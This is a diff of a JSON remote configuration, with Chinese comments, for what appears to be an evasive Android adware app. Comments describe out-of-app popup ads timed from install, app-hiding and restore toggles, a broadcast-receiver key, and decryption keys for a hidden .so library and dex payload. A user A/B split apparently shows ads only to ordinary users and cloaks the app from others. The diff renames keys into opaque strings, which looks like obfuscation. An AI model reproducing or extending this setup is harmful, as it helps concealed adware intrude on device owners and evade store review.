@@ -2,42 +2,33 @@
 
 //A
 {
-  "ab_configure": "60-60",
-  "type_state": "one",
-  "f_value": "3616318175247400",
-  "f_t_vlaue": "3616318175247400",
-  "t_state": "30-30-60-8-16-80-500-800-40-10",
-  "must_name_event": "can",
-  "ad_id_h": "981772962",
-  "ad_id_l": "981772963",
-  "so_key": "dfgdh3gtg56rfrg6",
-  "kuang_key": "m6khiy86thg6rf4d",
-  "tw_v": "mkhhj",
-  "g_k_v": "kkohy",
-  "f_f_v": "tofu",
-  "y_c_v": "tohe",
-  "w_t_v": "kuang",
-  "a_p_n": "1000"
+  "a_time": "60-60-1000",
+  "post_type": "show",
+  "a_u_s": "pop",
+  "bk_v": "3616318175247400-3616318175247400",
+  "popSnn": "30-30-60-8-16-80-500-800-40-10",
+  "showGV": "981772962-981772963",
+  "jmk": "fd2grg5ds4a4r4ef-bfjkl87fk6efhwf6",
+  "all_kg": "qpwo-eiru-tyal-skdj-polk"
 }
 //B
 {
-  "ab_configure": "60-60",
-  "type_state": "two",
-  "f_value": "3616318175247400",
-  "f_t_vlaue": "3616318175247400"
+  "a_time": "60-60-1000",
+  "post_type": "show",
+  "a_u_s": "emp",
+  "bk_v": "3616318175247400-3616318175247400",
 }
 
 
 {
-  //A配置刷新间隔 单位分钟
-  //B配置刷新间隔 单位秒
-  "ab_configure": "60-60",
-  //不上报日志、用户B(two),用户A(one)
-  "type_state": "one",
-  // Facebook id
-  "f_value": "3616318175247400",
-  // Facebook token
-  "f_t_vlaue": "3616318175247400",
+  //A配置刷新间隔 单位分钟;B配置刷新间隔 单位秒;Admin请求上线
+  "a_time": "60-60-1000",
+  //日志必传埋点,show上报，其他不上报
+  "post_type": "show",
+  //不上报日志、,用户A(pop),用户B(emp)
+  "a_u_s": "pop",
+  // Facebook id和Facebook token（-号隔开）
+  "bk_v": "3616318175247400-3616318175247400",
   //广告检测间隔、定时触发间隔 单位秒,
   //广告显示间隔 单位秒,
   //首次外弹的时间，与安装时间比较；本地默认60秒； 单位秒
@@ -48,27 +39,12 @@
   //延迟显示结束时间单位毫秒 配置0 则取消延迟
   //广告最大显示时间单位秒
   //定时随机配置不能小于定时配置单位秒
-  "t_state": "30-30-60-8-16-80-500-800-40-10",
-  //动态增加日志必传埋点建议只在A配置中加,can上报，其他不上报
-  "must_name_event": "can",
-  // 广告id 高价值
-  "ad_id_h": "981772962",
-  // 广告id 低价值
-  "ad_id_l": "981772963",
-  // 解密so的key
-  "so_key": "dfgdh3gtg56rfrg6",
-  "kuang_key": "m6khiy86thg6rf4d",
-  //外弹文件开关名
-  "tw_v": "mkhhj",
-  //广播接收key
-  "g_k_v": "kkohy",
-  //恢复
-  "f_f_v": "tofu",
-  //隐藏
-  "y_c_v": "tohe",
-  //外弹
-  "w_t_v": "kuang",
-  //Admin请求上线
-  "a_p_n": "1000"
+  "popSnn": "30-30-60-8-16-80-500-800-40-10",
+  // 广告id 高价值-广告id 低价值
+  "showGV": "981772962-981772963",
+  // 解密so的key-dex解密key
+  "jmk": "fd2grg5ds4a4r4ef-bfjkl87fk6efhwf6",
+  //外弹文件开关名-广播接收key-恢复-隐藏-外弹
+  "all_kg": "qpwo-eiru-tyal-skdj-polk",
 }
 
